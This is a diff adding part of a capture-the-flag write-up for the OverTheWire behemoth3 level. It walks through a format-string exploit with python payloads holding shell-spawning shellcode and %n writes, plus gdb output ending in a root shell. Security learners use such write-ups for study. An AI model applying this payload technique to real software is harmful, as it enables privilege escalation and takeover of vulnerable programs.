@@ -184,4 +184,79 @@ Breakpoint 1, 0x080484dc in main ()
 
 Perfect.  We got our first byte done.  The to calculate the rest.  The other bytes will follow the format of ```"the byte we want to write" - "the previous byte"```.
 
-TODO
+```
+(gdb) p 0xd1 - 0xa4
+$3 = 45
+```
+```
+# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n%45x%n"' > input
+```
+```
+(gdb) run < input
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
+Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000                                     4b4e554a
+
+aaaand goodbye again.
+
+Breakpoint 1, 0x080484dc in main ()
+(gdb) x/10x $esp
+0xffffd25c:	0x0000d1a4	0x00000000	0xffffd2f4	0xffffd2fc
+0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
+0xffffd27c:	0x08049798	0x08048230
+(gdb) p 0xff - 0xd1
+$4 = 46
+```
+```
+# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n%45x%n%46x%n"' > input
+```
+```
+(gdb) run < input
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
+Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000                                     4b4e554a                                      4b4e554a
+
+aaaand goodbye again.
+
+Breakpoint 1, 0x080484dc in main ()
+(gdb) x/10x $esp
+0xffffd25c:	0x00ffd1a4	0x00000000	0xffffd2f4	0xffffd2fc
+0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
+0xffffd27c:	0x08049798	0x08048230
+(gdb) p 0x1ff - 0xff
+$5 = 256
+```
+```
+# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n%45x%n%46x%n%256x%n"' > input
+```
+```
+(gdb) run < input
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
+Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000                                     4b4e554a                                      4b4e554a                                                                                                                                                                                                                                                        4b4e554a
+
+aaaand goodbye again.
+
+Breakpoint 1, 0x080484dc in main ()
+(gdb) x/10x $esp
+0xffffd25c:	0xffffd1a4	0x00000001	0xffffd2f4	0xffffd2fc
+0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
+0xffffd27c:	0x08049798	0x08048230
+(gdb) c
+Continuing.
+process 1737 is executing new program: /bin/dash
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x80484dc
+```
+
+It's a beautiful thing.  Let's head to the server.
